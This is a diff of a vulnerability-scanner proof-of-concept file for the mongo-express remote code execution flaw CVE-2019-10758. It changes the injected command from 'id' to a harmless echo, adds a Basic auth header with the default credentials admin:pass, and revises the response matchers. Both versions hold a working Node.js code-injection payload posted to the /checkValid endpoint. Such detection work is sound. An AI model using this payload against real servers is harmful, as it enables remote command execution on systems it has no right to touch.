@@ -1,8 +1,8 @@
 [info]
-author = "ave"
-description = "检测 mongo-express < 0.54.0 远程命令执行漏洞，利用 /checkValid 端点的 JavaScript 代码注入"
+author = "AVE"
+description = "向 /checkValid 端点发送包含恶意 document 参数的 POST 请求，利用 toBSON() 函数中 vm 依赖的不安全使用执行任意 Node.js 代码。若目标使用默认凭据 admin:pass 且版本低于 0.54.0，将执行命令并返回 200 状态码且响应体包含 Valid 标识。"
 id = "POC-AVE-2019-0168"
-name = "mongo-express RCE (CVE-2019-10758) PoC"
+name = "mongo-express 远程代码执行漏洞 PoC"
 severity = "critical"
 tags = ["ave-2019-0168"]
 vuln_id = [
@@ -19,22 +19,20 @@ path = "/{{BaseURL}}/checkValid"
 protocol = "http"
 
 [poc.requests.body]
-content = 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")'
-type = "form"
+content = 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("echo AVE_TEST")'
+type = "raw"
 
 [poc.requests.headers]
+Authorization = "Basic YWRtaW46cGFzcw=="
 Content-Type = "application/x-www-form-urlencoded"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "uid=",
-    "gid=",
-]
 
 [[poc.requests.matchers]]
 expect = true
 status = [200]
 type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Valid"]
